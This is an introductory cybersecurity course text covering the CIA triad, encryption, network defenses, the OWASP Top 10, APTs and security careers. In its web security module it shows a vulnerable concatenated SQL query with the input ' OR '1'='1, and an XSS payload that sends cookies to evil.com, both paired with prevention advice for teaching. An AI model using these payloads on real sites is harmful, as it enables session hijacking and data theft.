Module 1: Security Fundamentals & The CIA Triad

Introduction to Cybersecurity

Cybersecurity is the practice of defending computers, servers, mobile devices, electronic systems, networks, and data from malicious attacks. It's also known as information technology security or electronic information security. The field is growing in importance due to increasing reliance on computer systems, the Internet, and wireless network standards.

The CIA Triad

The CIA Triad is the foundation of information security, consisting of three core principles:

1. Confidentiality

Ensures that sensitive information is accessed only by an authorized person. It keeps information secret from unauthorized access. Methods include:

  • Encryption (AES, RSA, TLS/SSL)
  • Access controls and authentication
  • Data classification (Public, Internal, Confidential, Restricted)
  • Two-factor authentication (2FA)

2. Integrity

Ensures that the data is trustworthy and free from tampering. It guarantees that information is accurate and has not been altered by unauthorized parties. Methods include:

  • Hashing algorithms (SHA-256, MD5)
  • Digital signatures
  • Version control systems
  • File permissions

3. Availability

Ensures that information is accessible to authorized users when needed. Systems must be operational and accessible. Methods include:

  • Redundancy and failover systems
  • Regular backups
  • Disaster recovery planning
  • DDoS protection
📊 Security Breach Statistics: The average cost of a data breach in 2023 was $4.45 million. Human error accounts for 95% of cybersecurity breaches.

Module 2: Cryptography & Encryption

What is Cryptography?

Cryptography is the practice of securing communication and data through mathematical techniques. It transforms readable data (plaintext) into unreadable format (ciphertext) and back. The word comes from Greek "kryptos" meaning hidden.

Types of Encryption

Symmetric Encryption (Private Key)

Uses the same key for both encryption and decryption. Fast and efficient for large data, but key distribution is challenging.

  • AES (Advanced Encryption Standard): Most widely used, 128/192/256-bit keys
  • DES/3DES: Older standards, now considered insecure
  • ChaCha20: Modern stream cipher, used in TLS
# Symmetric Encryption Concept
Plain Text + Secret Key → [Encryption] → Cipher Text
Cipher Text + Secret Key → [Decryption] → Plain Text

# Same key used for both operations

Asymmetric Encryption (Public Key)

Uses a key pair: public key for encryption, private key for decryption. Solves key distribution problem but slower than symmetric.

  • RSA (Rivest-Shamir-Adleman): Based on factoring large primes, 2048+ bit keys
  • ECC (Elliptic Curve Cryptography): Stronger security with smaller keys
  • Diffie-Hellman: Key exchange protocol
# Asymmetric Encryption Concept
Plain Text + Public Key → [Encryption] → Cipher Text
Cipher Text + Private Key → [Decryption] → Plain Text

# Public key can be shared openly
# Private key must be kept secret

Hashing vs Encryption

Feature Hashing Encryption
Reversible No (one-way) Yes (two-way)
Output size Fixed length Variable length
Use case Passwords, integrity Data protection
Examples SHA-256, bcrypt AES, RSA

Common Hashing Algorithms

  • MD5: 128-bit, now broken and insecure
  • SHA-1: 160-bit, deprecated, don't use
  • SHA-256: 256-bit, current standard
  • bcrypt/Argon2: Designed for passwords, includes salt
💡 Best Practice: Always use salt when hashing passwords. Salt is random data added to each password before hashing, preventing rainbow table attacks and ensuring identical passwords have different hashes.

Digital Signatures

Digital signatures provide authentication, non-repudiation, and integrity. They use the sender's private key to sign and the public key to verify.

SSL/TLS and HTTPS

Transport Layer Security (TLS) encrypts data in transit. HTTPS = HTTP + TLS. TLS 1.3 is the current version. Certificate Authorities (CAs) validate website identities.

⚠️ Deprecated Protocols: Never use SSL 2.0/3.0 or TLS 1.0/1.1. They have known vulnerabilities (POODLE, BEAST, CRIME attacks). Always use TLS 1.2 or 1.3.

Module 3: Network Security & Firewalls

Network Security Fundamentals

Network security protects the integrity, confidentiality, and accessibility of computer networks and data. It combines multiple layers of defenses at the edge and in the network.

Firewalls

A firewall is a network security device that monitors and filters incoming and outgoing network traffic based on security policies. It acts as a barrier between trusted internal networks and untrusted external networks.

Types of Firewalls

  • Packet-Filtering: Examines packets, allows/blocks based on IP/port
  • Stateful Inspection: Tracks active connections, more intelligent
  • Proxy Firewall: Intermediary, inspects content at application layer
  • Next-Generation (NGFW): Deep packet inspection, intrusion prevention, application awareness

Network Segmentation

Dividing a network into smaller parts to improve security and performance. If one segment is compromised, others remain protected.

🔧 DMZ (Demilitarized Zone): A network segment that sits between the internal network and the internet. Public-facing servers (web, email) go here, providing a buffer zone.

Intrusion Detection/Prevention Systems

  • IDS (Intrusion Detection System): Monitors and alerts on suspicious activity
  • IPS (Intrusion Prevention System): Detects AND blocks threats automatically

VPN (Virtual Private Network)

Creates encrypted tunnels over public networks. Types include:

  • Site-to-Site VPN: Connects entire networks (branch offices)
  • Remote Access VPN: Individual users connect to corporate network
  • Protocols: IPsec, SSL/TLS, WireGuard, OpenVPN

Common Network Attacks

DDoS (Distributed Denial of Service)

Overwhelms target with traffic from multiple sources. Types: Volumetric (bandwidth exhaustion), Protocol (resource exhaustion), Application (layer 7 attacks).

Man-in-the-Middle (MitM)

Attacker secretly intercepts and possibly alters communication. Prevention: HTTPS, certificate pinning, VPNs.

ARP Spoofing

Sends fake ARP messages to link attacker's MAC address with IP address of legitimate computer. Can intercept LAN traffic.

# Network Security Layers (Defense in Depth)
Layer 1: Perimeter (Firewalls, IDS/IPS)
Layer 2: Network (Segmentation, VLANs)
Layer 3: Endpoint (Antivirus, EDR)
Layer 4: Application (WAF, secure coding)
Layer 5: Data (Encryption, DLP)

Wireless Security

Protocol Security Level Status

WPA Moderate TKIP encryption, outdated
WPA2 Strong AES encryption, current standard
WPA3 Very Strong Latest, enhanced security

Module 4: Web Application Security

OWASP Top 10

The Open Web Application Security Project (OWASP) publishes the top 10 most critical web application security risks. This is the industry standard awareness document.

Current OWASP Top 10 (2021)

  1. Broken Access Control: Users can access unauthorized functions/data
  2. Cryptographic Failures: Sensitive data exposure, weak encryption
  3. Injection: SQL, NoSQL, OS command, LDAP injection
  4. Insecure Design: Fundamental design flaws
  5. Security Misconfiguration: Default configs, incomplete setups
  6. Vulnerable Components: Outdated libraries and dependencies
  7. Authentication Failures: Weak auth, session management issues
  8. Data Integrity Failures: Insecure deserialization
  9. Logging Failures: Insufficient monitoring and logging
  10. SSRF: Server-Side Request Forgery

SQL Injection (SQLi)

Attacker inserts malicious SQL code through user input. Can read, modify, or delete database contents.

⚠️ Vulnerable Code Example:
query = "SELECT * FROM users WHERE username = '" + userInput + "'"

Attack Input: ' OR '1'='1
Result: Returns ALL users because 1=1 is always true!
✅ Prevention: Use parameterized queries/prepared statements. Never concatenate user input into SQL.
# SAFE: Parameterized Query (Python)
cursor.execute(
    "SELECT * FROM users WHERE username = %s",
    (user_input,)
)

# The database treats input as data only, never as code

Cross-Site Scripting (XSS)

Injection of malicious scripts into web pages viewed by other users. Types:

  • Stored XSS: Malicious script stored on server (database, comments)
  • Reflected XSS: Script in URL, reflected in page response
  • DOM-based XSS: Client-side JavaScript manipulation
# XSS Attack Example
# Attacker inputs in comment:
<script>document.location='https://evil.com/steal?cookie='+document.cookie'</script>

# Steals cookies of everyone who views the comment

Cross-Site Request Forgery (CSRF)

Tricks authenticated users into performing unwanted actions. User is logged into bank, visits malicious site, site submits transfer request using user's session.

Prevention: CSRF tokens, SameSite cookies, validate Referer header.

Other Critical Vulnerabilities

Security Misconfiguration

  • Default passwords (admin/admin)
  • Unnecessary features enabled
  • Error messages revealing stack traces
  • Missing security headers

Broken Authentication

  • Weak password policies
  • No account lockout
  • Session IDs in URLs
  • No MFA

Security Headers

Header Purpose
Content-Security-Policy Prevents XSS by controlling resources
X-Frame-Options Prevents clickjacking
X-XSS-Protection Browser XSS filter
Strict-Transport-Security Forces HTTPS

Module 5: Advanced Topics & Security Career

Advanced Persistent Threats (APTs)

Sophisticated, long-term cyberattacks where intruders gain access and remain undetected for extended periods. Usually state-sponsored or well-funded groups.

APT Lifecycle

  1. Reconnaissance: Gather information about target
  2. Initial Compromise: Exploit vulnerability, spear phishing
  3. Establish Foothold: Install backdoors, create persistence
  4. Escalate Privileges: Gain admin/root access
  5. Internal Reconnaissance: Map network, find valuable data
  6. Move Laterally: Access additional systems
  7. Maintain Presence: Ensure long-term access
  8. Complete Mission: Exfiltrate data, cause damage

Incident Response

Structured approach to handling security breaches:

NIST Incident Response Phases

  • Preparation: Tools, training, policies in place
  • Detection & Analysis: Identify and assess incidents
  • Containment: Limit damage, isolate systems
  • Eradication: Remove threat, patch vulnerabilities
  • Recovery: Restore systems to normal operation
  • Post-Incident: Lessons learned, improve defenses

Cloud Security

Shared responsibility model: Cloud provider secures infrastructure, customer secures data and access.

Cloud Security Challenges

  • Misconfigured storage buckets (public S3 buckets)
  • Inadequate identity management
  • Shadow IT (unauthorized cloud services)
  • Data loss and leakage

Cybersecurity Careers

Entry-Level Roles

  • SOC Analyst: Monitor security alerts, triage incidents
  • Security Specialist: Implement security measures
  • Junior Penetration Tester: Find vulnerabilities

Mid-Level Roles

  • Security Engineer: Design security systems
  • Incident Responder: Handle security breaches
  • Threat Hunter: Proactively find threats
  • Security Consultant: Advise organizations

Senior Roles

  • Security Architect: Design enterprise security
  • CISO (Chief Information Security Officer): Executive leadership
  • Red Team Lead: Advanced attack simulations

Industry Certifications

  • CompTIA Security+: Entry-level, broad knowledge
  • CISSP: Advanced, management focus
  • CEH: Ethical hacking
  • OSCP: Hands-on penetration testing
  • GCIH: Incident handling

Future of Cybersecurity

  • AI/ML in Security: Automated threat detection, behavioral analysis
  • Zero Trust Architecture: Never trust, always verify
  • Quantum Cryptography: Preparing for quantum computing threats
  • IoT Security: Securing billions of connected devices
